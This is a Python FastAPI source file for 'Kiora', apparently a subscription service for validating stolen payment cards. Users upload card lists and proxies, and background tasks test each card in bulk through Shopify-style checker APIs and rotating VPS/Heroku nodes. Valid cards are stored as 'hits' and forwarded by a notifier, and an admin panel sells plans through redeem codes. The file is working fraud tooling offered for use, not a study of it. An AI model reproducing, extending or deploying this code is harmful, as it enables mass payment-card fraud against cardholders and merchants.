import os, asyncio, random, uuid, json
from datetime import datetime, timezone
from typing import Optional
from contextlib import asynccontextmanager

from fastapi import FastAPI, Request, Form, Depends, HTTPException, BackgroundTasks, File, UploadFile
from fastapi.responses import HTMLResponse, RedirectResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from itsdangerous import URLSafeSerializer
import aiohttp

import db
import checker
import node_client
import notifier

SECRET_KEY = os.getenv("SECRET_KEY", "change-me-please-kiora-2026")
signer = URLSafeSerializer(SECRET_KEY, salt="kiora-session-v1")

_tasks: dict[str, asyncio.Task] = {}

@asynccontextmanager
async def lifespan(app: FastAPI):
    await db.init_db()
    yield
    for t in list(_tasks.values()):
        if not t.done(): t.cancel()
    await checker.close_session()
    await node_client.NODE_MANAGER_VPS.close()
    await node_client.NODE_MANAGER_HEROKU.close()

app = FastAPI(lifespan=lifespan, docs_url=None, redoc_url=None)
app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="templates")

def _set_session(resp, uid: int):
    resp.set_cookie("sess", signer.dumps({"uid": uid}), httponly=True, samesite="lax", max_age=86400 * 7)

def _clear_session(resp):
    resp.delete_cookie("sess")

async def current_user(request: Request):
    tok = request.cookies.get("sess")
    if not tok: return None
    try:
        data = signer.loads(tok)
        return await db.get_user_by_id(int(data["uid"]))
    except Exception:
        return None

async def require_user(request: Request):
    u = await current_user(request)
    if not u: raise HTTPException(status_code=401)
    if u["banned"]: raise HTTPException(status_code=403)
    return u

async def require_admin(request: Request):
    u = await require_user(request)
    if u["role"] != "admin": raise HTTPException(status_code=403)
    return u

@app.get("/", response_class=HTMLResponse)
async def root(request: Request):
    u = await current_user(request)
    if u: return RedirectResponse("/admin" if u["role"] == "admin" else "/dashboard")
    return RedirectResponse("/login")

@app.get("/login", response_class=HTMLResponse)
async def login_page(request: Request):
    u = await current_user(request)
    if u: return RedirectResponse("/admin" if u["role"] == "admin" else "/dashboard")
    return templates.TemplateResponse("login.html", {"request": request, "error": ""})

@app.post("/login")
async def login_submit(request: Request, email: str = Form(...), password: str = Form(...)):
    u = await db.get_user_by_email(email.strip().lower())
    if not u or not db.verify_pw(password, u["password_hash"]):
        return templates.TemplateResponse("login.html", {"request": request, "error": "Invalid email or password."}, status_code=401)
    if u["banned"]:
        return templates.TemplateResponse("login.html", {"request": request, "error": "Account suspended."}, status_code=403)
    async with db._conn() as c:
        await c.execute("UPDATE users SET last_login=? WHERE id=?", (db.now_iso(), u["id"]))
        await c.commit()
    resp = RedirectResponse("/admin" if u["role"] == "admin" else "/dashboard", status_code=302)
    _set_session(resp, u["id"])
    return resp

@app.get("/logout")
async def logout():
    resp = RedirectResponse("/login", status_code=302)
    _clear_session(resp)
    return resp

@app.get("/dashboard", response_class=HTMLResponse)
async def user_dashboard(request: Request):
    u = await require_user(request)
    if u["role"] == "admin": return RedirectResponse("/admin")
    proxies = await db.list_proxies(u["id"])
    tasks = await db.list_user_tasks(u["id"], 15)
    hits = await db.list_user_hits(u["id"], 10)
    return templates.TemplateResponse("user.html", {
        "request": request, "u": u, "tab": "dashboard",
        "proxies": proxies, "tasks": tasks, "hits": hits,
        "plans": db.PLANS,
    })

@app.get("/proxies", response_class=HTMLResponse)
async def user_proxies(request: Request):
    u = await require_user(request)
    if u["role"] == "admin": return RedirectResponse("/admin")
    proxies = await db.list_proxies(u["id"])
    return templates.TemplateResponse("user.html", {
        "request": request, "u": u, "tab": "proxies", "proxies": proxies, "plans": db.PLANS,
    })

@app.get("/cards", response_class=HTMLResponse)
async def user_cards(request: Request):
    u = await require_user(request)
    if u["role"] == "admin": return RedirectResponse("/admin")
    return templates.TemplateResponse("user.html", {
        "request": request, "u": u, "tab": "cards", "plans": db.PLANS,
    })

@app.get("/hits", response_class=HTMLResponse)
async def user_hits(request: Request):
    u = await require_user(request)
    if u["role"] == "admin": return RedirectResponse("/admin")
    hits = await db.list_user_hits(u["id"], 500)
    return templates.TemplateResponse("user.html", {
        "request": request, "u": u, "tab": "hits", "hits": hits, "plans": db.PLANS,
    })

@app.post("/proxies/add")
async def proxies_add(request: Request, proxies_text: str = Form(None), proxy_file: UploadFile = File(None)):
    u = await require_user(request)
    
    raw_content = ""
    if proxies_text:
        raw_content += proxies_text + "\n"
        
    if proxy_file and proxy_file.filename:
        contents = await proxy_file.read()
        raw_content += contents.decode("utf-8", errors="ignore") + "\n"

    if not raw_content.strip():
        return RedirectResponse("/proxies", 303)

    count = 0
    for line in raw_content.replace(",", "\n").splitlines():
        p = line.strip()
        if not p: continue
        await db.add_proxy(u["id"], p)
        count += 1
        
    return RedirectResponse("/proxies", 303)

@app.post("/proxies/check")
async def proxies_check(request: Request):
    u = await require_user(request)
    proxies = await db.list_proxies(u["id"])
    async def _one(row):
        pid, p = row["id"], row["proxy"]
        proxy_url = checker._proxy_url(p)
        start = datetime.now(timezone.utc).timestamp()
        try:
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as s:
                async with s.get("https://api.ipify.org", proxy=proxy_url, timeout=aiohttp.ClientTimeout(total=15)) as r:
                    ok = (r.status == 200)
                    lat = round(datetime.now(timezone.utc).timestamp() - start, 2)
                    await db.update_proxy_status(pid, "live" if ok else "dead", lat if ok else 0)
                    return
        except Exception:
            await db.update_proxy_status(pid, "dead", 0)
    await asyncio.gather(*(_one(r) for r in proxies))
    return RedirectResponse("/proxies", 303)

@app.post("/proxies/delete/{pid}")
async def proxies_delete(pid: int, request: Request):
    u = await require_user(request)
    await db.delete_proxy(pid, u["id"])
    return RedirectResponse("/proxies", 303)

@app.post("/proxies/clear")
async def proxies_clear(request: Request):
    u = await require_user(request)
    await db.clear_proxies(u["id"])
    return RedirectResponse("/proxies", 303)

@app.post("/start-task")
async def start_task(request: Request, cards_text: str = Form(None), cards_file: UploadFile = File(None), mode: str = Form("shopify")):
    u = await require_user(request)
    
    raw_content = ""
    if cards_text:
        raw_content += cards_text + "\n"
        
    if cards_file and cards_file.filename:
        contents = await cards_file.read()
        raw_content += contents.decode("utf-8", errors="ignore") + "\n"

    cards = []
    seen = set()
    for tok in raw_content.replace(",", "\n").splitlines():
        n = checker.normalize_cc(tok)
        if n and n not in seen:
            seen.add(n); cards.append(n)
            
    if not cards:
        return RedirectResponse("/cards?error=no_cards", 303)

    plan = u["plan"] if u["plan"] in db.PLANS else "free"
    limit = db.PLANS[plan]["mass_limit"]
    if len(cards) > limit:
        return RedirectResponse(f"/cards?error=limit_{limit}", 303)

    proxies = await db.live_proxies(u["id"])
    if not proxies and u["role"] != "admin":
        return RedirectResponse("/cards?error=no_proxies", 303)

    tid = uuid.uuid4().hex[:12]
    await db.create_task(tid, u["id"], len(cards), mode)
    _tasks[tid] = asyncio.create_task(_run_task(tid, u["id"], u["email"], cards, [p["proxy"] for p in proxies], mode))
    return RedirectResponse(f"/cards?started={tid}", 303)

async def _run_task(tid: str, uid: int, email: str, cards: list, proxies: list, mode: str):
    apis = await db.enabled_apis()
    if not apis:
        await db.update_task(tid, status="error")
        return

    lb_vps = (await db.get_setting("lb_vps_enabled", "1")) == "1"
    lb_hrk = (await db.get_setting("lb_heroku_enabled", "1")) == "1"
    api_idx = 0
    px_idx = 0
    completed = 0; hits = 0; declined = 0; errors = 0

    for cc in cards:
        proxy = proxies[px_idx % len(proxies)] if proxies else None
        px_idx += 1

        res = None
        if (lb_vps or lb_hrk) and mode == "shopify":
            managers = []
            if lb_vps: managers.append(node_client.NODE_MANAGER_VPS)
            if lb_hrk: managers.append(node_client.NODE_MANAGER_HEROKU)
            random.shuffle(managers)
            for m in managers:
                try:
                    raw = await m.check(cc, proxy or "")
                    if raw and raw.get("Response"):
                        res = checker.parse_response(json.dumps(raw), 200)
                        res["_rtt"] = round((raw.get("_rtt_ms") or 0) / 1000, 2)
                        break
                except Exception:
                    continue

        if res is None:
            api = apis[api_idx % len(apis)]
            api_idx += 1
            res = await checker.check_cc(cc, api, proxy)

        completed += 1
        cls = res.get("cls", "error")
        if checker.is_hit(cls):
            hits += 1
            await db.save_hit(uid, tid, cc, res, res.get("site", ""))
            try: asyncio.create_task(notifier.forward_hit(cc, res, email))
            except: pass
        elif cls in ("error", "timeout", "site_error", "proxy_error", "rate_limited"):
            errors += 1
        else:
            declined += 1

        if completed % 3 == 0 or completed == len(cards):
            await db.update_task(tid, completed=completed, hits=hits, declined=declined, errors=errors)

    await db.update_task(tid, status="done", completed=completed, hits=hits, declined=declined, errors=errors, ended_at=db.now_iso())

@app.get("/api/task/{tid}")
async def api_task(tid: str, request: Request):
    u = await require_user(request)
    t = await db.get_task(tid)
    if not t or (t["user_id"] != u["id"] and u["role"] != "admin"):
        return JSONResponse({"error": "not found"}, status_code=404)
    return JSONResponse(dict(t))

@app.get("/admin", response_class=HTMLResponse)
async def admin_dash(request: Request, tab: str = "overview"):
    u = await require_admin(request)
    users = await db.list_users()
    apis = await db.list_apis()
    hits = await db.list_all_hits(100)
    tasks = await db.list_all_tasks(50)
    codes = await db.list_codes()
    settings = {}
    for key in ("telegram_bot_token", "telegram_chat_id", "telegram_enabled", "site_mode", "lb_vps_enabled", "lb_heroku_enabled"):
        settings[key] = await db.get_setting(key, "")

    return templates.TemplateResponse("admin.html", {
        "request": request, "u": u, "tab": tab,
        "users": users, "apis": apis, "hits": hits, "tasks": tasks, "codes": codes,
        "settings": settings, "plans": db.PLANS,
        "node_vps": node_client.NODE_MANAGER_VPS.summary(),
        "node_hrk": node_client.NODE_MANAGER_HEROKU.summary(),
    })

@app.post("/admin/users/create")
async def admin_user_create(request: Request):
    await require_admin(request)
    form = await request.form()
    email = (form.get("email") or "").strip().lower()
    password = (form.get("password") or "").strip()
    plan = (form.get("plan") or "free").strip()
    if not email or not password: return RedirectResponse("/admin?tab=users&error=missing", 303)
    try:
        await db.create_user(email, password, plan)
    except Exception:
        return RedirectResponse("/admin?tab=users&error=exists", 303)
    return RedirectResponse("/admin?tab=users", 303)

@app.post("/admin/users/plan/{uid}")
async def admin_user_plan(uid: int, request: Request):
    await require_admin(request)
    form = await request.form()
    plan = (form.get("plan") or "free").strip()
    days = int(form.get("days") or 30)
    await db.update_user_plan(uid, plan, days)
    return RedirectResponse("/admin?tab=users", 303)

@app.post("/admin/users/ban/{uid}")
async def admin_user_ban(uid: int, request: Request):
    await require_admin(request)
    await db.toggle_user_ban(uid)
    return RedirectResponse("/admin?tab=users", 303)

@app.post("/admin/users/delete/{uid}")
async def admin_user_delete(uid: int, request: Request):
    await require_admin(request)
    await db.delete_user(uid)
    return RedirectResponse("/admin?tab=users", 303)

@app.post("/admin/apis/add")
async def admin_api_add(request: Request):
    await require_admin(request)
    form = await request.form()
    url = (form.get("url") or "").strip()
    style = (form.get("style") or "params").strip()
    cap = int(form.get("cap") or 900)
    site_req = int(form.get("site_required") or 0)
    key = (form.get("key") or "").strip()
    if url:
        await db.add_api(url, style, cap, site_req, key)
    return RedirectResponse("/admin?tab=apis", 303)

@app.post("/admin/apis/toggle/{aid}")
async def admin_api_toggle(aid: int, request: Request):
    await require_admin(request)
    await db.toggle_api(aid)
    return RedirectResponse("/admin?tab=apis", 303)

@app.post("/admin/apis/delete/{aid}")
async def admin_api_delete(aid: int, request: Request):
    await require_admin(request)
    await db.delete_api(aid)
    return RedirectResponse("/admin?tab=apis", 303)

@app.post("/admin/settings")
async def admin_settings_save(request: Request):
    await require_admin(request)
    form = await request.form()
    for key in ("telegram_bot_token", "telegram_chat_id", "telegram_enabled", "site_mode", "lb_vps_enabled", "lb_heroku_enabled"):
        if key in form:
            await db.set_setting(key, str(form.get(key) or ""))
    return RedirectResponse("/admin?tab=settings", 303)

@app.post("/admin/codes/create")
async def admin_code_create(request: Request):
    await require_admin(request)
    form = await request.form()
    plan = (form.get("plan") or "basic").strip()
    days = int(form.get("days") or 30)
    uses = int(form.get("uses") or 1)
    code = "KIORA-" + uuid.uuid4().hex[:8].upper()
    await db.create_code(code, plan, days, uses)
    return RedirectResponse("/admin?tab=codes", 303)

@app.post("/admin/hits/delete/{hid}")
async def admin_hit_delete(hid: int, request: Request):
    await require_admin(request)
    async with db._conn() as c:
        await c.execute("DELETE FROM hits WHERE id=?", (hid,))
        await c.commit()
    return RedirectResponse("/admin?tab=hits", 303)

@app.get("/health")
async def health(): return {"ok": True}
